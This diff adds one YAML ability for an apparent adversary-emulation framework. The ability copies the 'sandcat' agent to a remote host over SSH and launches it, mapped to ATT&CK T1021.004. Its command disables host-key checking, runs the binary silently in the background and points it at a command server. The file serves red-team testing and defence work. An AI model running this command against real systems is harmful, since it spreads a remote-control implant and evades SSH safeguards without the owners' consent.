@@ -1,0 +1,22 @@
+---
+- id: deception-ssh-copy
+  name: Deception copy and start agent over ssh (passwordless)
+  description: Copy 54ndc47 to remote host and start it
+  tactic: deception-lateral-movement
+  technique:
+    attack_id: T1021.004
+    name: "Remote Services: SSH"
+  repeatable: True
+  platforms:
+    linux:
+      sh:
+        command: "scp -o StrictHostKeyChecking=no
+          -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.sshcmd}:~/sandcat_tmp.go
+          &&
+          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+          -o ConnectTimeout=3 #{host.lateralMove.sshcmd} 'nohup ./sandcat_tmp.go -server #{server}
+          -group red 1>/dev/null 2>/dev/null &'"
+        cleanup:
+        payloads:
+          - sandcat.go-linux
+        timeout: 15
